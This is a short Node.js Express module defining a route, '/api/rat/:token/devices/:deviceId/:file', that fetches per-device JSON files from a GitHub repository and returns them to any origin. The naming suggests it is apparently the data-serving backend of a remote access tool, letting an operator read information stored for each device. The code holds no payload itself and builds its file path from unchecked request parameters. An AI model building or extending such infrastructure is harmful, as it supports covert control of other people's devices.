module.exports = function(app) {
    const axios = require('axios');
    const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
    const GITHUB_USER = 'daffaadev';
    const GITHUB_REPO = 'api';

    app.get('/api/rat/:token/devices/:deviceId/:file', async (req, res) => {
        res.setHeader('Access-Control-Allow-Origin', '*');

        try {
            const { token, deviceId, file } = req.params;

            if (!token || !deviceId || !file) {
                return res.status(400).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            // Pastikan file .json
            if (!file.endsWith('.json')) {
                return res.status(400).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            const filePath = `device/${token}/devices/${deviceId}/${file}`;

            let fileContent = null;
            try {
                const getRes = await axios.get(
                    `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
                    {
                        headers: {
                            'Authorization': `token ${GITHUB_TOKEN}`,
                            'Accept': 'application/vnd.github.v3+json'
                        }
                    }
                );
                const content = Buffer.from(getRes.data.content, 'base64').toString('utf-8');
                fileContent = JSON.parse(content);
            } catch (e) {
                if (e.response && e.response.status === 404) {
                    return res.status(404).json({
                        success: false,
                        message: 'Invalid parameters.'
                    });
                }
                throw e;
            }

            res.status(200).json({
                success: true,
                data: fileContent
            });

        } catch (error) {
            res.status(500).json({
                success: false,
                message: 'Invalid parameters.'
            });
        }
    });
};
